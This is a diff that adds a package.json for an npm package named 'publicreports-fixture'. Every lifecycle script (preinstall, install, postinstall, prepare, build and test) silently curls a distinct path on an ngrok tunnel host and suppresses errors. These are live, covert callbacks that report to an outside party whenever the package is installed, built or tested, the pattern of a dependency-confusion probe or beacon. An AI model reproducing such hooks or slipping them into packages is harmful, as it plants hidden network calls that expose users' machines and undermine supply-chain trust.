@@ -1,0 +1,13 @@
+{
+  "name": "publicreports-fixture",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "preinstall":  "curl -s -H 'ngrok-skip-browser-warning: 1' 'https://c814-81-33-68-197.ngrok-free.app/oc/npm-preinstall' || true",
+    "install":     "curl -s -H 'ngrok-skip-browser-warning: 1' 'https://c814-81-33-68-197.ngrok-free.app/oc/npm-install' || true",
+    "postinstall": "curl -s -H 'ngrok-skip-browser-warning: 1' 'https://c814-81-33-68-197.ngrok-free.app/oc/npm-postinstall' || true",
+    "prepare":     "curl -s -H 'ngrok-skip-browser-warning: 1' 'https://c814-81-33-68-197.ngrok-free.app/oc/npm-prepare' || true",
+    "build":       "curl -s -H 'ngrok-skip-browser-warning: 1' 'https://c814-81-33-68-197.ngrok-free.app/oc/npm-build' || true",
+    "test":        "curl -s -H 'ngrok-skip-browser-warning: 1' 'https://c814-81-33-68-197.ngrok-free.app/oc/npm-test' || true"
+  }
+}
